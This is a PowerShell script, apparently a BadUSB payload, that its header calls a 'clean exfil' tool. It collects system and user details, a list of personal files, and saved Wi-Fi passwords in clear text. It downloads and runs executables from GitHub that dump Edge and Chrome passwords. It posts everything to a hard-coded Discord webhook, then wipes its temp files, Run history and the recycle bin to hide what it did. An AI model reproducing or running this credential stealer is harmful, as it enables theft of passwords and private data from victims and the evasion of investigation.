#(09/03/2024) - I generated this file to perform a clean exfil sent to the webhook of your choosing.None of the heavy lifting in this script is of my own creation I borrowed from people much more knowledagbel than myself.
#A special thanks to: @riadzx⚡ (momentum discord server) special thanks for their work on the .go code for the chrome.exe and edge.exe files, @.k.a.r.m.a__ (momentum discord server) for their work on the ALL_Exfil_Fast++.js script
#A HUGE THANKS TO :  I-Am-Jakoby for creating the framework I used to generate this .ps1 file. 
#

$D="$env:tmp";

New-Item -ItemType Directory -Force -Path $D\Pass;

cd $D\Pass;




$Date = Get-Date -Format yyy-MM-dd;
$Time = Get-Date -Format HH-mm-ss;
dir env:
$FileName = "${Date}_${env:computername}_${Time}.txt";

$env:computername | Out-File $FileName -Force;

Add-Content -Path $FileName -Value “Computer Info”;
Get-LocalUser | Where-Object -Property PasswordRequired -Match false | Out-File $FileName -Append;
Get-LocalUser | Out-File $FileName -Append;


Get-CimInstance -ClassName Win32_ComputerSystem | Out-File $FileName -Append;
Get-LocalUser | Where-Object -Property PasswordRequired -Match false | Out-File $FileName -Append;
Get-LocalUser | Out-File $FileName -Append;


Add-Content -Path $FileName -Value “WiFi Info”;

Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' | Out-File $FileName -Append;
Get-ChildItem -Path $userDir -Include *.txt, *.doc, *.docx, *.pptx, *.xlsx, *.pdf, *.jpg, *.png, *.mp3, *.mp4, *.zip, *.rar -Recurse | Out-File $FileName -Append;


$networks = (netsh wlan show profiles) | Select-String 'All User Profile\s+:\s(.+)'
foreach ($network in $networks) {
    $name = $network.Matches.Groups[1].Value.Trim()
    $password = (netsh wlan show profile name="$name" key=clear) | Select-String 'Key Content\s+:\s(.+)' | ForEach-Object {
        $_.Matches.Groups[1].Value.Trim()
    }
    [PSCustomObject]@{
        PROFILE_NAME = $name
        PASSWORD = $password
    } | Out-File $FileName -Append;
}



Add-Content -Path $FileName -Value “Edge Passwords”; 
     
    $edgeUrl = 'https://github.com/luciferseamus/Browser_exe/raw/main/edge/edge.exe';
    $EdgePath = '.\edge.exe';
    if (-not (Test-Path -Path $EdgePath)) {Invoke-WebRequest -Uri $edgeUrl -OutFile $edgePath;}
$EdgeOutput = & $edgePath | Out-File $FileName -Append;
    


Add-Content -Path $FileName -Value “Chrome Passwords”;


    $chromeUrl = 'https://github.com/luciferseamus/Browser_exe/raw/main/chrome/chrome.exe';
    $chromePath = '.\chrome.exe';
    if (-not (Test-Path -Path $chromePath)) {Invoke-WebRequest -Uri $chromeUrl -OutFile $chromePath;}
$chromeOutput = & $chromePath | Out-File $FileName -Append;
   



$args1 = Get-Content .\$FileName;

$statOutput = $args1 | Out-String;
    $webhookUrl = 'https://discord.com/api/webhooks/1348814707741560965/8JqGswXF_UakFLRmb7of-8KduCTgbbxFTvfM2K0MGh4DW7yPjHFxR2OZlMEGTdT1N4L5';
    $chunks = [Math]::Ceiling($statOutput.Length / 2000);for ($i = 0; $i -lt $chunks; $i++) {$start = $i * 2000;$length = [Math]::Min(2000, $statOutput.Length - $start);$content = $statOutput.Substring($start, $length); 
    $webhookContent = @{'username' = 'V1Ru7EnT';'content' = $content;};  
    $jsonData = ConvertTo-Json -InputObject $webhookContent;IWR -Uri $webhookUrl -Method Post -Body $jsonData -ContentType 'application/json';Start-Sleep -Seconds 1;};

########################################################################################################################################################################

cd $D
# empty temp folder
rm Pass* -r -Force -ErrorAction SilentlyContinue;

# delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f;

# Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue;